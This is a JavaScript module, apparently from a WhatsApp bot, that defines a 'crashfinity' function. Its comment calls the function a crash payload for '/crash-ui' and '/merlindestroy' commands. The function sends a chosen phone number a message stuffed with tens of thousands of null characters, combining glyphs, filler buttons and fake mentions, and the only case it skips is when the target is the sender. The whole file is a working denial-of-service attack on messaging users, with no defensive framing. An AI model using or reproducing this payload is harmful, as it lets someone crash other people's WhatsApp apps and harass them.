const crypto = require('crypto');

// ============================================================
// crashfinity.js — direct invisible crash payload
// Used by /crash-ui and /merlindestroy commands
// ============================================================

async function crashfinity(sock, target) {
    if (!sock || !target) {
        console.log('[crashfinity] missing sock or target');
        return;
    }

    // Sender guard
    try {
        const senderRaw = (sock.user && sock.user.id) ? String(sock.user.id) : '';
        const senderNum = senderRaw.split('@')[0].split(':')[0];
        const targetNum = String(target).split('@')[0].split(':')[0];
        if (senderNum && targetNum && senderNum === targetNum) {
            console.log('[crashfinity] skipped — target equals sender');
            return;
        }
    } catch (_) {}

    let targetJid = String(target).trim();
    if (!targetJid.includes('@')) {
        targetJid = targetJid.replace(/\D/g, '') + '@s.whatsapp.net';
    }

    const N = 50000;

    const payload = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "\u0000".repeat(N) + "𑇂𑆵𑆴𑆿".repeat(N),
                        subtitle: "ᅠ".repeat(N),
                        hasMediaAttachment: false
                    },
                    body: {
                        text: "\u0000".repeat(N) + "𑇂𑆵𑆴𑆿".repeat(N)
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500 }, () => ({
                            name: "quick_reply",
                            buttonParamsJson: JSON.stringify({
                                display_text: "ᅠ".repeat(500),
                                id: "\u0000".repeat(500)
                            })
                        })),
                        messageParamsJson: JSON.stringify({
                            limited_time_offer: {
                                text: "\u0000".repeat(N),
                                url: "https://x".repeat(30000),
                                copy_code: "A".repeat(N)
                            },
                            bottom_sheet: {
                                text: "B".repeat(N),
                                in_thread_buttons_limit: 500
                            }
                        })
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 10000 }, (_, i) => `\u0000${i}@s.whatsapp.net`),
                        forwardingScore: 2147483647,
                        isForwarded: true,
                        expiration: 0
                    }
                }
            }
        }
    };

    try {
        await sock.relayMessage(targetJid, payload, {
            messageId: 'CF' + Date.now().toString(36).toUpperCase() + crypto.randomBytes(4).toString('hex'),
            noSelfSync: true,
            additionalAttributes: { 'device_fanout': 'false' },
            additionalNodes: [{
                tag: 'meta',
                attrs: {},
                content: [{ tag: 'mentioned_users', attrs: {}, content: [] }]
            }]
        });
        console.log('[crashfinity] sent to', targetJid);
    } catch (e) {
        console.log('[crashfinity]', (e && e.message) ? e.message : e);
    }
}

module.exports = { crashfinity };
